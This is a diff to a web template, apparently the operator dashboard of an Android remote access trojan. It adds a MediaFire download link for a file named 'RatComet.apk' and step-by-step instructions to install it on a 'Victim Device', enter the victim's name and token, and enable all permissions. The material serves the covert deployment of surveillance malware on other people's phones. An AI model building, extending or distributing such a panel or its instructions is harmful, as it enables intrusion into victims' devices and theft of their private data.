@@ -23,10 +23,9 @@
             </div>
             <!-- /.card-header -->
             <div class="card-body">
-                <button type="button" class="btn btn-block btn-outline-primary btn-flat toastrDefaultSuccess" wire:click="download">CLICK HERE</button> 
-                <ul>
-                  <li>Install The Application in Victim Device</li>
-                </ul>
+                <button type="button" class="btn btn-block btn-outline-primary btn-flat toastrDefaultSuccess" wire:click="download">CLICK HERE</button> <br>
+                <em>Having trouble downloading???..... <a href="https://www.mediafire.com/file/f311nq79z23lbgp/RatComet.apk/file" target="blank">Click Here</a></em>
+
             </div>
             <!-- /.card-body -->
           </div>
@@ -46,6 +45,7 @@
           <!-- /.card-header -->
           <div class="card-body">
             <ul>
+              <li>Install The <i>Downloaded Application</i> in Victim Device</li>
               <li>Enter the Victim Name and The Token</li>
               <li>Make Sure to cross check the token to be 100% right</li>
               <li>PRESS STEP 1 AND ENABLE ALL PERMISSIONS</li>
